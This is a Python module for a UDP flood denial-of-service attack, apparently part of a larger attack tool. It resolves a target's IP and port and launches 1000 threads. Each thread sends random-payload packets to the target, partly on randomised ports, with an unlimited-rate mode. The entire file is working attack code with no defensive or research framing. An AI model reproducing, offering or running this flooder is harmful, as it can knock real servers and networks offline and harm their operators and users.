"""
UDP Flood Attack Handler
"""

import socket
import random
import threading
import time

class UDPFlood:
    def __init__(self):
        self.name = "UDP FLOOD"
        self.running = False
        self.stats = {
            'packets': 0,
            'errors': 0,
            'threads': 0
        }
        self.target_ip = None
        self.target_port = None
        self.threads = []
    
    def resolve_target(self, target):
        """Extract IP and port from URL"""
        from urllib.parse import urlparse
        parsed = urlparse(target)
        hostname = parsed.netloc.split(':')[0]
        
        try:
            self.target_ip = socket.gethostbyname(hostname)
        except:
            self.target_ip = hostname
        
        # Default ports
        if parsed.scheme == 'https':
            self.target_port = 443
        else:
            self.target_port = 80
        
        # Custom port if specified
        if ':' in parsed.netloc:
            try:
                self.target_port = int(parsed.netloc.split(':')[1])
            except:
                pass
    
    def flood_worker(self, worker_id, threads_per_sec):
        """Single UDP flood worker"""
        while self.running:
            try:
                # Create UDP socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # Generate random data
                data_size = random.randint(64, 1024)
                data = random._urandom(data_size)
                
                # Random target port (for more chaos)
                port = self.target_port
                if random.random() > 0.7:
                    port = random.randint(1, 65535)
                
                # Send packet
                sock.sendto(data, (self.target_ip, port))
                
                self.stats['packets'] += 1
                sock.close()
                
                # Rate limiting based on threads per second
                if threads_per_sec > 0:
                    time.sleep(1.0 / threads_per_sec)
                
            except Exception:
                self.stats['errors'] += 1
    
    def start(self, target, threads_config, main_tool):
        """Start UDP flood attack"""
        self.running = True
        self.target = target
        self.resolve_target(target)
        
        print(f"\n{self.name} attack started on {self.target_ip}:{self.target_port}")
        
        threads_per_sec = threads_config
        worker_count = 1000  # 1000 threads total
        
        # Calculate delay based on threads per second
        if threads_per_sec == 0:
            # Unlimited mode - no delay
            thread_delay = 0
        else:
            thread_delay = 1.0 / threads_per_sec
        
        # Start workers
        for i in range(worker_count):
            if not self.running:
                break
            
            thread = threading.Thread(
                target=self.flood_worker,
                args=(i, threads_per_sec)
            )
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
            self.stats['threads'] = len(self.threads)
            
            # Small delay to prevent overwhelming system
            if thread_delay > 0:
                time.sleep(thread_delay)
        
        # Keep main thread alive
        while self.running and main_tool.running:
            time.sleep(1)
    
    def stop(self):
        """Stop UDP flood"""
        self.running = False
    
    def get_stats(self):
        """Get current statistics"""
        return self.stats
